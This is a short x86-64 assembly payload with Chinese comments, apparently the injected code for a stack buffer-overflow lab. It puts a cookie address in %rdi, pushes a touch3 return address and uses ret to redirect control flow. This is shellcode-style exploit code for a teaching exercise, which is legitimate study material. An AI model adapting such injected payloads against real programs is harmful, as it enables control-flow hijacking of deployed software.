mov $0x5561dc78,%rdi   # 将cookie给%rdi
push $0x4018fa         # 将touch3的返回地址压入栈中
ret                    # 手动使用ret返回到touch3的地址
